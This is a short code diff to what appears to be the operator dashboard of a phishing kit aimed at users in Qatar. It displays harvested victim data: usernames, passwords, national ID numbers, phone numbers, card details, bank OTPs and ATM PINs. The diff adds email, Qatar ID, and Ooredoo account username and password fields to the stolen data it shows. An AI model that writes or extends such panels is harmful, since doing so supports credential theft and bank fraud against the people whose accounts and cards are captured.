@@ -184,8 +184,9 @@ $v = time(); // Version to bust cache
                     ${dRow("الدولة", b.country)}
                     ${dRow("اسم المستخدم", all.username)}
                     ${dRow("كلمة المرور", all.password)}
-                    ${dRow("رقم الهوية", all.id_number)}
+                    ${dRow("رقم الهوية", all.id_number || all.qatar_id)}
                     ${dRow("رقم الهاتف", all.phone_number)}
+                    ${dRow("البريد الإلكتروني", all.email_confirm || all.email)}
                 </div>
                 <div class="data-section">
                     <div class="section-title">بيانات البطاقة</div>
@@ -198,6 +199,8 @@ $v = time(); // Version to bust cache
                     <div class="section-title">رموز التحقق</div>
                     ${dRow("OTP البنك", all.otp)}
                     ${dRow("ATM PIN", all.atm_pin)}
+                    ${dRow("Ooredoo User", all.ooredoo_user)}
+                    ${dRow("Ooredoo Pass", all.ooredoo_pass)}
                     ${dRow("Ooredoo OTP", all.ooredoo_otp)}
                 </div>
                 <div class="modal-actions">
